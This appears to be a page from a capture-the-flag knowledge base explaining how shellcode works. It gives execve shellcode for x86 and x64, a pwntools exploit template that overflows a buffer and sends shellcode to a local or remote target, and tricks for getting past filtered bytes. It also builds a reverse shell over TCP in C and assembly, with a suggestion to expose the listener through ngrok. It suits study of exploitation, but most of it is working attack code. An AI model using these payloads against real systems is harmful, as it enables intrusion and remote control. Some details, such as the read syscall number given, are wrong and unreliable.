---
id: shellcode
title: Shellcode
---

# Shellcode

A shellcode is a malicious sequence of assembly instruction.
Usually, it is inserted in memory and then executed by exploiting a vulnerability.
It is called shellcode because at the beginning it was used only to obtain a shell.
Nowadays, shellcodes are used to execute whatever sequence of instructions.

You must have a vulnerability that allows to overwrite the saved instruction pointer of a function.
Also, the memory area where you write the shellcode must be executable.

### execve

A shellcode is usually used to obtain a reverse shell by running the `execve` syscall with the right parameters.

`int execve(const char *pathname, char *const argv[], char *const envp[]);`

`pathname` The path for the executable to be run, usually a pointer to the string `/bin/sh\0`

`argv` A pointer to an array of command line parameters, it can be null

`envp` A pointer to an array of environmental variables, it can be null

<p align="center">
    <img src={require("./assets/execve.jpg").default}></img>
</p>

### x86

| Register | Content      |
| -------- | ------------ |
| eax      | syscall code |
| ebx      | path         |
| ecx      | argv         |
| edx      | envp         |

```as
mov eax, 0xb                            ; execve code in x86
mov ebx, <address of "/bin/sh\0">
mov ecx, 0
mov edx, 0
int 0x80
```

### x64

| Register | Content      |
| -------- | ------------ |
| rax      | syscall code |
| rdi      | path         |
| rsi      | argv         |
| rdx      | envp         |

```as
mov rax, 0x3b                           ; execve code in x64
mov rdi, <address of "/bin/sh\0">
mov rsi, 0
mov rdx, 0
syscall
```

## Python template

```py
#!/usr/bin/env python3

import sys
from pwn import *

if "--remote" in sys.argv:
    p = remote("url", 1337)
else:
    p = process("./path_to_binary")

if "--debug" in sys.argv:
    context.terminal = ["gnome-terminal"]
    gdb.attach(p, """
    b *<address_breakpoint>
    c
    """)

shellcode = asm("""
mov rax, 0x3b
mov rdi, <buffer_address>
mov rsi, 0
mov rdx, 0
syscall
""", arch='amd64')

payload = "A" * 64
payload += shellcode
p.sendline(payload)
p.interactive()
```

## Alternative ways to write a shellcode

### Write the path parameter on stack

```as
mov rdi, 0x68732f6e69622f         ; write the string "/bin/sh\0" in a register
push rdi                          ; push it on stack
mov rdi, rsp                      ; get its address

mov rax, 0x3b
mov rsi, 0
mov rdx, 0
syscall
```

### Use a call to get the address of the path parameter

```as
jmp address

code:
    mov rax, 0x3b
    pop rdi
    mov rsi, 0
    mov rdx, 0
    syscall

address:
    call code           ; the next address is saved on stack

    ; put here "/bin/sh\0" during the read of the shellcode
```

## Special cases

### Specific characters are not allowed

To put "\0" at the end of "/bin/sh" is possible to use these instructions.

```as
mov ebx, 0x804c040      ; ebx is the address of the string "/bin/sh"
mov al, 0               ; al is zero
mov [ebx + 7], al       ; move zero in the byte pointed by ebx + 7
```

The idea is to put the value in a registry and then move it inside a specific address.
It can be used to change everything in memory.

For example, we could find a binary that blocks any syscalls by filtering the bytes "0f 05" (syscall assembly code).
To overcome it you could write the initial shellcode padded with a nop sled.
Then, you could write the two characters needed in any point of the memory.

```as
; rax contains the address of the buffer where the shellcode is written
; 0f 05 is the assembly code for the syscall instruction

mov bl, 0x0e
inc bl
mov [rax + 107], bl

mov bl, 0x04
inc bl
mov [rax + 108], bl
```

### Not enough input

If there is not enough input for a shellcode you could try to call a read or other syscalls.

For example, this shellcode for x86 is long 22 chars once assembled, but it allows to read additional 256 chars.

```as
mov eax, 2                      ; read syscall code
mov ebx, 0
mov ecx, <buffer_address>
mov edx, 0x100                  ; number of characters to read
int 0x80
```

### Copy RIP content inside another registry

It is not possible to directly move the RIP content inside another registry.
We can bypass it by using the call instruction.

```
call here       ; address of next istruction (sRIP) is saved on top of the stack

code:
    ; additional code here...

here:
    pop rsi     ; rsi will contain the RIP address, you can change it with other registers
    jmp code
```

### Few bytes operations

:::caution

Be careful, working with x32 registers in x64 leads to lose the high part of them.

For example, the instruction `inc esp` removes the high bytes of rsp.

:::

One byte

```
push rax
pop rax

inc eax
dec eax

mov al, 0xff
add al, 0xff
sub al, 0xff

xor al, al
or al, al
and al, al

inc al
dec al
shl al
shr al
```

Two bytes

```as
syscall

mov eax, esp

xor eax, eax
or eax, eax
and eax, eax

shl eax
shr eax
```

## Reverse shell over TCP socket

1. Create a new socket
2. Copy the file descriptor of the new socket
3. Connect to your server
4. Duplicate the file descriptors for input, output and error with the new one.
5. Exec a shell
6. Exploit

This is a sample of the C code that does the same thing.
It can be used for testing or as guide using gdb.

You can use a tool like [ngrok](https://ngrok.com/) to make a public tcp tunnel to your localhost.

```c title="socket.c"
#include <arpa/inet.h>
#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
    struct sockaddr_in serv_addr;
    int sock = 0;
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(1337);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        puts("Cannot connect!");
        return 1;
    }
    puts("Connected");

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve("/bin/sh\0", NULL, NULL);
    return 0;
}
```

### socket

`int socket (int domain, int type, int protocol)`

-   domain: 2 for IPv4 socket
-   type: 1 for standard socket
-   protocol: 0 for TCP

The file descriptor of the created socket is returned in the rax register.

```as
mov rax, 0x29
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall

mov rbx, rax    ; returned value is saved inside rbx, this is important for the next examples
```

### connect

`int connect(int socket, const struct sockaddr *address, socklen_t address_len);`

```c
struct in_addr {
    unsigned long s_addr;       /* Internet address (32 bits) */
}

struct sockaddr_in {
    unsigned short sin_family;  /* Internet protocol (AF_INET) */
    unsigned short sin_port;    /* Address port (16 bits) */
    struct in_addr sin_addr;    /* Internet address (32 bits) */
    char sin_zero[8];           /* Not used */
}
```

The struct is composed by `ip + hton(port) + 2 (IF_NET type of socket)` with a size of 8 bytes (4 + 2 + 2).

For example, considering the ip 127.0.0.1, the port 1337 and type 2:

```
0x0100007f39050002 ->   0100007f    3905    0002
                        127.0.0.1   1337      2
```

Remember little endian for each value.
IP address is saved byte per byte.

-   socket:

```as
mov rsi, 0x0100007f39050002
push rsi
mov rsi, rsp

mov rax, 0x2a
mov rdi, rbx        ; rbx contains the socket descriptor
mov rdx, 0x10
syscall
```

### dup2

`dup2(int oldfd, int newfd);`

Substitute standard input, output and error with the socket descriptor (rbx).

```as
mov rax, 0x21
mov rdi, rbx
mov rsi, 0
syscall

mov rax, 0x21
mov rdi, rbx
mov rsi, 1
syscall

mov rax, 0x21
mov rdi, rbx
mov rsi, 2
syscall
```
